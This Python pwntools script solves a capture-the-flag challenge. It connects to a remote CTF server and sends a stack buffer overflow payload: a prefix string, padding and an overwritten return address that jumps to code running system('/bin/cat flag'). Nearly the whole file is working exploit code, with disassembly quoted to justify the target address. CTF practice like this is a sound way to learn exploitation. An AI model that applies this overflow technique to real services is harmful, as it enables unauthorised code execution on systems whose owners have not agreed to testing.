#!/usr/bin/env python

from pwn import *

r = remote('pwn2.securityfest.ctf.rocks', '1337')

"""
.text:0000000000400983 BF 0C 0B 40 00  mov     edi, offset command ; "/bin/cat flag"
.text:0000000000400988 E8 63 FD FF FF  call    _system
.text:000000000040098D BF 00 00 00 00  mov     edi, 0          ; status
.text:0000000000400992 E8 E9 FD FF FF  call    _exit
"""

shellcode = "123456\x00"
shellcode += "A" * 17
shellcode += p64(0x0000000000400983)
r.sendline(shellcode)

print r.recvuntil('}')
